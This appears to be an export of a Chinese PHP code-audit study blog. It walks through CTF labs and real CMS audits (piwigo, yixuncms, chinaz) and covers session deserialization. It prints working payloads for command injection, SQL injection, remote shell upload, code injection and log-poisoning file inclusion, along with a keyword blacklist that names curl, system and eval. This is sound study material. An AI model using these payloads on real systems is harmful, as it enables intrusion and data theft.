&#x27;onmouseup&#x27;, &#x27;onmousewheel&#x27;, &#x27;onmove&#x27;, &#x27;onmoveend&#x27;, &#x27;onmovestart&#x27;, &#x27;onpaste&#x27;, &#x27;onpropertychange&#x27;, &#x27;onreadystatechange&#x27;, &#x27;onreset&#x27;, &#x27;onresize&#x27;, &#x27;onresizeend&#x27;, &#x27;onresizestart&#x27;, &#x27;onrowenter&#x27;, &#x27;onrowexit&#x27;, &#x27;onrowsdelete&#x27;, &#x27;onrowsinserted&#x27;, &#x27;onscroll&#x27;, &#x27;onselect&#x27;, &#x27;onselectionchange&#x27;, &#x27;onselectstart&#x27;, &#x27;onstart&#x27;, &#x27;onstop&#x27;, &#x27;onsubmit&#x27;, &#x27;onunload&#x27;); $ra = array_merge($ra1, $ra2); $found = true; while ($found == true) &#123; $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; $pattern = &#x27;/&#x27;; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; if ($j &gt; 0) &#123; $pattern .= &#x27;(&#x27;; $pattern .= &#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;; $pattern .= &#x27;|&#x27;; $pattern .= &#x27;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&#x27;; $pattern .= &#x27;)*&#x27;; &#125; $pattern .= $ra[$i][$j]; &#125; $pattern .= &#x27;/i&#x27;; $replacement = substr($ra[$i], 0, 2).&#x27;&lt;x&gt;&#x27;.substr($ra[$i], 2); $val = preg_replace($pattern, $replacement, $val); if ($val_before == $val) &#123; $found = false; &#125; &#125; &#125; return $val; &#125; 0x04 CTF练习 123456789101112131415161718192021// index.php&lt;?php $url = $_GET[&#x27;url&#x27;];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match(&#x27;/sec-redclub.com$/&#x27;,$site_info[&#x27;host&#x27;]))&#123; exec(&#x27;curl &quot;&#x27;.$site_info[&#x27;host&#x27;].&#x27;&quot;&#x27;, $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&#x27;host&#x27;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;; echo implode(&#x27; &#x27;, $result); &#125; else&#123; die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); &#125;&#125;else&#123; echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;&#125;?&gt; 1234// f1agi3hEre.php&lt;?php$flag = &quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;?&gt; mochazz师傅给的payload： 1?url&#x3D;demo:&#x2F;&#x2F;%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80&#x2F; 但是相同的payload不能成功，问题出在parse_url()解析的时候： 123[&quot;scheme&quot;]&#x3D;&gt; string(4) &quot;demo&quot; [&quot;host&quot;]&#x3D;&gt; string(5) &quot;&quot;;ls;&quot; [&quot;fragment&quot;]&#x3D;&gt; string(20) &quot;;sec-redclub.com:80&#x2F;&quot; 这样就会导致perg_match匹配失败。我换了另外一个payload，用于闭合最后一个&quot;： 1http:&#x2F;&#x2F;192.168.153.132:8003&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F; 解释一下这个Payload： 先来绕过 filter_var 的 FILTER_VALIDATE_URL 过滤器，这里提供几个绕过方法，如下： 12345678http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.comPS:最后一个payload的#符号，请换成对应的url编码 %23 接着要绕过 parse_url 函数，并且满足 $site_info[‘host’] 的值以 sec-redclub.com 结尾 1?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F; 第一个%22用于闭合前面的双引号，分号可以在Linux系统上连续执行命令，后面一个%22用于闭合后面的引号。","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP代码审计学习——Day1","date":"2020-06-09T11:30:48.000Z","path":"code_audit/3.PHP代码审计学习——Day1/","text":"PHP代码审计学习——Day1 in_array函数缺陷 学习资源均来自于mochazz师傅，感谢红日安全代码审计小组的分享 0x01 Day1 - Wish List 123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &#x27;./solutions/&#x27;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&#x27;name&#x27;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&#x27;tmp_name&#x27;], self::UPLOAD_DIRECTORY . $this-&gt;file[&#x27;name&#x27;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&#x27;solution&#x27;]); 这一关卡考察的是一个任意文件上传漏洞，主要问题出在in_array函数，来看官方文档对这个函数的解释： in_array (PHP 4, PHP 5, PHP 7) 功能：检查数组中是否存在某个值 定义：in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool 在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。 由于该函数并未将第三个参数设置为，所以攻击者可以利用此处构造文件名为7shell.php，in_array()函数会将7shell.php强制转换为数字7，数字7在$this-&gt; whitelist也就是数组的1-24中，绕过in_array()的函数判断，可以构造任意文件上传漏洞。 0x02 实例分析 - piwigo2.7.1 首先安装好网站后，随便发布一张图片，漏洞的入口文件在 picture.php 中，具体代码如下： 12345678910111213// picture.phpif (isset($_GET[&#x27;action&#x27;]))&#123; switch ($_GET[&#x27;action&#x27;]) &#123;...... case &#x27;rate&#x27; : &#123; include_once(PHPWG_ROOT_PATH.&#x27;include/functions_rate.inc.php&#x27;); rate_picture($page[&#x27;image_id&#x27;], $_POST[&#x27;rate&#x27;]); redirect($url_self); &#125;...... 当 $_GET[‘action’] 为 rate 的时候，就会调用文件 include/functions_rate.inc.php 中的 rate_picture 方法，而漏洞便存在这个方法中。 跟入rate_picture 函數，函数对 $rate 变量进行检测，判断 ​rate 是否在 ​$conf[‘rate_items’] 中， ​$conf[‘rate_items’] 的内容可以在 include\\config_default.inc.php 中找到，为 $conf['rate_items'] = array(0,1,2,3,4,5); 12345678910111213141516171819202122232425262728293031function rate_picture($image_id, $rate)&#123; global $conf, $user; if (!isset($rate) or !$conf[&#x27;rate&#x27;] or !in_array($rate, $conf[&#x27;rate_items&#x27;])) &#123; return false; &#125; $user_anonymous = is_autorize_status(ACCESS_CLASSIC) ? false : true; if ($user_anonymous and !$conf[&#x27;rate_anonymous&#x27;]) &#123; return false; &#125; ...... $query = &#x27;INSERT INTO &#x27;.RATE_TABLE.&#x27; (user_id,anonymous_id,element_id,rate,date) VALUES (&#x27; .$user[&#x27;id&#x27;].&#x27;,&#x27; .&#x27;\\&#x27;&#x27;.$anonymous_id.&#x27;\\&#x27;,&#x27; .$image_id.&#x27;,&#x27; .$rate .&#x27;,NOW());&#x27;; pwg_query($query); 由于这里（第7行）并没有将 in_array() 函数的第三个参数设置为 true ，所以会进行弱比较，可以绕过。比如我们将 $rate 的值设置成 1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 那么SQL语句就变成： 1INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#,NOW()) ; 0x03 练习题 1234567891011121314151617181920212223242526272829303132333435363738//index.php&lt;?phpinclude &#x27;config.php&#x27;;$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot;);&#125;$sql = &quot;SELECT COUNT(*) FROM users&quot;;$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row[&#x27;COUNT(*)&#x27;]);&#125;$id = stop_hack($_GET[&#x27;id&#x27;]);$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;if (!in_array($id, $whitelist)) &#123; die(&quot;id $id is not in whitelist.&quot;);&#125;$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;; foreach ($row as $key =&gt; $value) &#123; echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; &#125; echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;;&#125;else&#123; die($conn-&gt;error);&#125;?&gt; 1234567891011121314151617//config.php&lt;?php $servername = &quot;localhost&quot;;$username = &quot;fire&quot;;$password = &quot;fire&quot;;$dbname = &quot;day1&quot;;function stop_hack($value)&#123; $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack)&#123; if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); &#125; return $value;&#125;?&gt; 1234567891011121314151617# 搭建CTF环境使用的sql语句create database day1;use day1;create table users (id int(6) unsigned auto_increment primary key,name varchar(20) not null,email varchar(30) not null,salary int(8) unsigned not null );INSERT INTO users VALUES(1,&#x27;Lucia&#x27;,&#x27;Lucia@hongri.com&#x27;,3000);INSERT INTO users VALUES(2,&#x27;Danny&#x27;,&#x27;Danny@hongri.com&#x27;,4500);INSERT INTO users VALUES(3,&#x27;Alina&#x27;,&#x27;Alina@hongri.com&#x27;,2700);INSERT INTO users VALUES(4,&#x27;Jameson&#x27;,&#x27;Jameson@hongri.com&#x27;,10000);INSERT INTO users VALUES(5,&#x27;Allie&#x27;,&#x27;Allie@hongri.com&#x27;,6000);create table flag(flag varchar(30) not null);INSERT INTO flag VALUES(&#x27;HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;&#x27;); 尝试对id这个参数注入发现config.php对注入进行了限制，过滤了关键字insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval。 我们可以使用报错注入，把group_concat换成make_set函数用于拼接字符串。 make_set：https://blog.csdn.net/qq_41725312/article/details/83039525 Payload： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;PHP-Audit-Labs&#x2F;day1&#x2F;?id&#x3D;3%20and%20(select%20updatexml(1,make_set(3,%27~%27,(select%20flag% 20from％20flag）），1））","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP代码审计——yixuncms","date":"2020-06-08T07:28:46.000Z","path":"code_audit/1.PHP代码审计复现——yixuncms/","text":"PHP代码审计——yixuncms审计 0x01 审计入口 对于一个MVC结构而言，比较重要的就是首先弄清楚路由是怎么走的，首先看到index.php中包含了home/index.php，其中第106行调用了Prourl::parseUrl();，这个函数就是用来解析Url： 1234567891011121314151617181920212223242526272829303132333435363738394041// class/prourl.class.php&lt;?php class Prourl &#123; /** * URL路由,转为PATHINFO的格式 */ static function parseUrl()&#123; if (isset($_SERVER[&#x27;PATH_INFO&#x27;]))&#123; //获取 pathinfo $pathinfo = explode(&#x27;/&#x27;, trim($_SERVER[&#x27;PATH_INFO&#x27;], &quot;/&quot;)); // 获取 control $_GET[&#x27;m&#x27;] = (!empty($pathinfo[0]) ? $pathinfo[0] : &#x27;index&#x27;); array_shift($pathinfo); //将数组开头的单元移出数组 // 获取 action $_GET[&#x27;a&#x27;] = (!empty($pathinfo[0]) ? $pathinfo[0] : &#x27;index&#x27;); array_shift($pathinfo); //再将将数组开头的单元移出数组 for($i=0; $i&lt;count($pathinfo); $i+=2)&#123; $_GET[$pathinfo[$i]]=$pathinfo[$i+1]; &#125; &#125;else&#123; $_GET[&quot;m&quot;]= (!empty($_GET[&#x27;m&#x27;]) ? $_GET[&#x27;m&#x27;]: &#x27;index&#x27;); //默认是index模块 $_GET[&quot;a&quot;]= (!empty($_GET[&#x27;a&#x27;]) ? $_GET[&#x27;a&#x27;] : &#x27;index&#x27;); //默认是index动作 if($_SERVER[&quot;QUERY_STRING&quot;])&#123; $m=$_GET[&quot;m&quot;]; unset($_GET[&quot;m&quot;]); //去除数组中的m $a=$_GET[&quot;a&quot;]; unset($_GET[&quot;a&quot;]); //去除数组中的a $query=http_build_query($_GET); //形成0=foo&amp;1=bar&amp;2=baz&amp;3=boom&amp;cow=milk格式 //组成新的URL $url=$_SERVER[&quot;SCRIPT_NAME&quot;].&quot;/&#123;$m&#125;/&#123;$a&#125;/&quot;.str_replace(array(&quot;&amp;&quot;,&quot;=&quot;), &quot;/&quot;, $query); header(&quot;Location:&quot;.$url); &#125; &#125; &#125; &#125; ‘PATH_INFO’ 包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL http://www.example.com/php/path_info.php/some/stuff?foo=bar 被访问，那么 $_SERVER[‘PATH_INFO’] 将包含 /some/stuff。 举个例子，假如访问http://127.0.0.1/index.php/index/hello/pid/1，那么parseUrl()函数会将index解析成类名，hello解析成方法名，pid是参数名，1是参数值。如果是通过GET传参的形式传入的话，那么就会先将Url转换成上面这种表示形式，再按相同的流程处理。 另外，项目中的runtime是对网站的缓存文件，也就说假如你访问了admin后台网站，那么第二次再访问的时候就会在runtime目录下执行，而不是进入admin目录。 0x02 审计过程 首先用Seay和Rips工具扫描一遍，有一个大概的方向。 controls/flink.class.php任意文件删除 123456789101112131415161718192021222324252627function update()&#123; $flink = D(&#x27;flink&#x27;); if(isset($_POST[&#x27;logoc&#x27;]))&#123; $logo = $flink-&gt;downlogo($_POST[&#x27;logoc&#x27;]); $srclogo = PROJECT_PATH.&quot;public/uploads/logos/&quot;.$_POST[&quot;logo&quot;]; if(file_exists($srclogo)) unlink($srclogo); &#125;else&#123; $logo = $_POST[&quot;logo&quot;]; &#125; if($logo)&#123; $_POST[&quot;logo&quot;] = $logo; if($flink-&gt;update($_POST,1,1))&#123; $this-&gt;redirect(&quot;index&quot;); &#125;else&#123; $mess = $flink-&gt;getMsg(); if($mess == &quot;&quot;) $mess = &quot;您未做任何修改&quot;; $this-&gt;mess($mess,false); $this-&gt;assign(&quot;post&quot;,$_POST); &#125; &#125;else&#123; $this-&gt;mess(&quot;LOGO下载失败，请检查URL地址是否正确&quot;,false); $this-&gt;assign(&quot;post&quot;,$_POST); &#125; $this-&gt;display(&quot;mod&quot;); &#125; 漏洞出在第55行的unlink()函数，参数$srclogo是由用户POST参数logo再拼接网站目录得到的，而且没有任何过滤，那么就很容易利用路径遍历来删除任何文件。利用方式： models/flink.php.class文件写入 首先通过一个危险函数file_put_contens()定位到models/flink.class.php文件 12345678910111213141516171819&lt;?php class Flink&#123; function downlogo($logourl)&#123; $url = parse_url($logourl); $logoname = str_replace(&quot;.&quot;,&quot;_&quot;,$url[&#x27;host&#x27;]).&quot;.&quot;.array_pop(explode(&quot;.&quot;,basename($logourl))); $path = PROJECT_PATH.&quot;public/uploads/logos/&quot;; if(!file_exists($path))&#123; mkdir($path); &#125; $location = $path.$logoname; $data = file_get_contents($logourl); if(strlen($data) &gt; 0)&#123; file_put_contents($location,$data); return $logoname; &#125;else&#123; return false; &#125; &#125; &#125; file_put_contents()接收两个参数：$location和$data。$location参数是通过拼接.public/uploads/logos和$logoname，而logoname首先通过parse_url把$logourl解析成数组形式，然后再把host字段的值中的.替换成_，后缀名是文件的后缀名，举个例子：加入$url=http://127.0.0.1/shell.php，那么$logoname=127_0_0_1.php。另外，$data参数是通过file_get_contents()函数读取Url中的文件内容。 全局搜索downlogo关键字，发现controls/flink.class.php文件中的insert()函数调用了downlogo()函数，通过POST的方式传参。利用方式如下： 第一步首先在自己的VPS中写一个shell.php文件： 1234567&lt;?php echo &quot; &lt;?php system(&#x27;ipconfig&#x27;); ?&gt; &quot;;?&gt; 因为源代码中是通过file_get_contents()函数读取文件内容，所以我们必须把真正的shell文件内容echo到页面上。 发起请求 访问http://localhost/public/uploads/logos/xx_xx_xx_xx.php classes/baseset.class.php任意代码执行 仍然是全局搜索file_put_contents关键字，在classes/baseset.class.php文件中 123456789static function writeindex($style,$start)&#123; $file=PROJECT_PATH.&quot;index.php&quot;; $content=file_get_contents($file); $reg[]=&quot;/define\\(\\&quot;TPLSTYLE\\&quot;.+?;/i&quot;; $reg[]=&quot;/define\\(\\&quot;CSTART\\&quot;.+?;/i&quot;; $rep[]=&quot;define(\\&quot;TPLSTYLE\\&quot;,\\&quot;&#123;$style&#125;\\&quot;);&quot;; $rep[]=&quot;define(\\&quot;CSTART\\&quot;,\\&quot;&#123;$start&#125;\\&quot;);&quot;; file_put_contents($file, preg_replace($reg, $rep, $content));&#125; 简单来讲，writeindex()函数就是将index.php中的两个常量TPLSTYLE和CSTART的值分别替换成$style和$start。 123456&lt;?php define(&quot;CSTART&quot;,&quot;0&quot;); //是否开启缓存 1开启 0关闭 define(&quot;TPLSTYLE&quot;,&quot;default&quot;); //默认模板存放的目录 define(&quot;APP&quot;, &quot;./home&quot;); require &quot;./php/index.php&quot;;?&gt; 如果$start=0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php // ，那么就变成了： 12&lt;?php define(&quot;CSTART&quot;,&quot;0&quot;); &lt;?php phpinfo(); ?&gt; &lt;?php //&quot;); 这样就造成了代码执行漏洞。 那么我们来看看哪些地方调用了writeindex()函数： 再全局搜索writeindex()函数： 利用方式： 0x03 常见函数 代码执行函数 文件相关函数","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP代码审计——chinaz","date":"2020-06-06T16:02:12.000Z","path":"code_audit/2.PHP代码审计复现——chinaz/","text":"PHP代码审计学习——chinaz 0x01 审计入口 首先chinaz没有后台数据库，并且是一个单入口类，不同于上一篇Yixuncms是一个MVC的架构模式。 123456789101112131415// index.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);$view_class = new View();$data = array();if (isset($_GET[&#x27;page&#x27;]))&#123; $data[&#x27;page&#x27;] = filter($_GET[&#x27;page&#x27;]);&#125;else&#123; $data[&#x27;page&#x27;] = &#x27;js&#x27;;&#125;$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);?&gt; 在index.php文件中可以看到首先包含了公共文件和渲染文件进来，然后new了一个View类的对象。 接着检测是否以get方式传入page变量，如果有则调用filter方法过滤变量中的数据，最后再调用echoContent方法加载页面。 那么网站的目录结构也就大概清楚了，library中包含公共文件和渲染文件，logs中记录日志，static是一些静态资源文件，views 类似视图文件，文件中包含了HTML代码，各个模块通过action.phpPOST参数跳转到相应功能模块的PHP文件。 0x02 工具扫描 首先上工具，用Seay和rips扫一遍： rips结果： Seay结果： 这两个工具都提到了action.php中的require_once()函数，那就从这个地方出发。 0x03 审计过程 action.php文件包含 1234567891011//action.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);$page = filter($_POST[&#x27;page&#x27;]).&#x27;.php&#x27;;$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125;@require_once($page);?&gt; POST一个page变量时，经过filter函数处理，最后利用require_once()包含进来。 filter()函数了过滤.，并且限定了文件后缀名为.php，那么这个点的利用思路就比较清晰了：使用绝对路径的方式传入$page参数读取本地文件，另外，如果PHP版本小于5.4.3，还可以使用%00截断的方式读取任意后缀名的文件。 利用方式： normaliz.php变量覆盖 根据工具扫描结果审计normaliz.php文件。 123456789101112131415161718192021222324252627282930313233// normaliz.php&lt;?phprequire_once(&quot;library/common.php&quot;);require_once(&quot;library/view.php&quot;);function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; try&#123; if ($method == &#x27;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&#x27;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; catch(Exception $e) &#123; write_log($e-&gt;getMessage()); $res=$source; &#125; return $res;&#125;$view_class = new View();$data = array();$data[&#x27;page&#x27;] = &#x27;normaliz&#x27;;$ip_replacement = &#x27;222.222.222.222&#x27;;$mail_replacement = &#x27;lollol@lol.com&#x27;;$data[&#x27;res&#x27;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&#x27;page&#x27;], $data);?&gt; 第12行和16行代码看到一个比较敏感的函数preg_replace()，在PHP7.0版本之前可以使用/e模式执行PHP代码。 其中都需要传入三个参数：$method、$ip_replacement或$mail_repalcement、$source，这三个参数都可以通过第7行的$$操作符进行变量覆盖。而post_data参数是在action.php通过POST来赋值，那么利用方式就比较清楚了： common.php任意文件写入 首先看到file_put_contents()函数 123456// common.phpfunction write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 全局查找$cfg_logfile参数 回溯$input参数，发现load_file()中调用了write_log()函数： 12345678910111213// common.phpfunction loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&#x27;Try to open Null file:&#x27;.$filePath); return file_get_contents($cfg_basedir.&#x27;/error.php&#x27;); &#125; $fp = @fopen($filePath,&#x27;r&#x27;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 回溯$file_path参数，发现在view.php中的echo_content()调用了loadfile()函数： 12345678910// view.phpfunction echoContent($vId, $data) &#123; $this-&gt;data = $data; $content = loadFile(&quot;views/&quot;.$vId.&quot;.php&quot;); $content = $this-&gt;parseHeadAndFoot($content); $content = $this-&gt;parseVal($content); $content = $this-&gt;parseIf($content); echo $content; &#125; 接着回溯$vId参数，查看echoContent()函数的调用情况： 主要是分两大类： phpcom.php、md5.php和normaliz.php都是在action.php中通过传入page变量，从而包含进来的，故不可控； index.php下传入的是page变量 那个就可以通过GET方式给page变量赋值，写入文件内容，然后通过write_log()函数写入logfile.php文件中，利用方式： 先写入&lt;?php phpinfo(); ?&gt; 接着通过action.php文件包含来执行命令： 其实这里用php文件去存储日志就很离谱。 view.php代码执行 这个点还是比较有难度的","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"PHP反序列化学习-session反序列化","date":"2020-05-30T06:58:14.000Z","path":"Web_security/php_related/4.PHP反序列化学习-session反序列化/","text":"PHP反序列化漏洞学习——Session反序列化 0x01 PHP的Session机制 在学习 session 反序列化之前，我们需要了解这几个参数的含义。 Directive 含义 session.save_handler session保存形式。默认为files session.save_path session保存路径。 session.serialize_handler session序列化存储所用处理器。默认为php session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启 session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 那么具体而言，在默认配置情况下： 12345&lt;?phpsession_start()$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSION文件的内容是：name|s:5:&quot;ca01h&quot;，name是键值，s:5:&quot;ca01h&quot;;是serialize(&quot;ca01h&quot;)的结果。 在php_serialize引擎下： 123456&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSION文件的内容是a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;ca01h&quot;;&#125;。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。 在php_binary引擎下： 123456&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;name&#x27;] = &#x27;ca01h&#x27;;var_dump();?&gt; SESSION文件的内容是\u0004names:6:&quot;spoock&quot;;。由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是\u0004names:6:&quot;spoock&quot;;。 0x02 PHP Session反序列化的漏洞原因 PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如： 1$_SESSION[&#x27;ca01h&#x27;] = &#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;; 上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下： 1a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125; 在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成： 123456789&lt;?phpvar_dump($_SESSION);?&gt;array(1) &#123; [&quot;a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;&quot;]=&gt; object(stdClass)#1 (0) &#123; &#125;&#125; 这是因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;作为SESSION的key，将O:8:&quot;stdClass&quot;:0:&#123;&#125;作为value，然后进行反序列化，最后就会得到stdClass这个类。 实际利用的话一般分为两种： session.auto_start=On 当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了session_start()），因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。 123456789// foo1.phpif(ini_get(&#x27;session.auto_start&#x27;)) session_destroy();ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();if(isset($_GET[&#x27;test&#x27;])) $_SESSION[&#x27;test&#x27;] = $_GET[&#x27;test&#x27;]; 访问http://127.0.0.1/test/serialize/foo1.php?test=|O:8:&quot;stdClass&quot;:0:&#123;&#125; 